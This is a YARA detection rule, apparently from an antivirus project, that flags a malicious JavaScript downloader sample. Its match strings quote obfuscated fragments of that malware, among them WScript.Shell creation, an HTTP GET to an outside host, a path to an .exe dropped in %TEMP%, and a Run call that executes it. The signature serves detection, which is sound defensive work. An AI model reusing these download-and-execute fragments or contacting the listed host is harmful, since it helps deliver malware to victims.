rule sig_20160328_4a2f3231a14063c003aff0e9bdaed429 {
  meta:
    description = "datamaliciousorder - file 20160328_4a2f3231a14063c003aff0e9bdaed429.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "faa81f106284544b8314171d334c17439b6abec5f4a5b02f301fac5e035f1205"

  strings:
    $s1  = "function Prnrftuxi() {return Yuuxfsv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hTinTKqXvmA.exe\";};" fullword ascii
    $s2  = "do {WScript[Yywyctxdsj](Myieyznww() * 11)} while (Nhnpamex[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Dvfqmq(Mesgxgpzb, Slwayvenl){return Mesgxgpzb - Slwayvenl;};" fullword ascii
    $s4  = "var Yuuxfsv = function Fhvvwlb() {return WScript[Nzpvzh](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Nhnpamex[Txfrpnaril](\"GET\", \"http://lovelustandliving.ca/pow2lk\", false);" fullword ascii
    $s6  = "function Mqrttdto() {return ((Miuiagj == true) && (Miuiagj == Wqhseo)) ? 1 : Huowhscyn;};" fullword ascii
    $s7  = "function Xexix(Wchwft){Yuuxfsv[\"Run\"](Wchwft, Huowhscyn, Huowhscyn);};" fullword ascii
    $s8  = "function Qcppzsp(Efxhay) {var Sonqmub = (1, 2, 3, 4, 5, Efxhay); return Sonqmub;};" fullword ascii
    $s9  = "var Wqhseo = false;" fullword ascii
    $s10 = "function Uapuwzcevq(){return Pwlfooiwyc;};" fullword ascii
    $s11 = "var Miuiagj = false;" fullword ascii
    $s12 = "function Myieyznww(){return 22;};" fullword ascii
    $s13 = "Wqhseo = true; " fullword ascii
    $s14 = "Miuiagj = true; " fullword ascii
    $s15 = "var Vzdckemr = new this[\"Date\"]();" fullword ascii
    $s16 = "function Zukzzwkq(){return Nzpvzh;};" fullword ascii
    $s17 = "return Dvfqmq(Oudtxwvovp, Hlvwhzqjn);" fullword ascii
    $s18 = "function Dvoefqf()" fullword ascii
    $s19 = "var Jvdkv = false;" fullword ascii
    $s20 = " while (Crlwrc){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}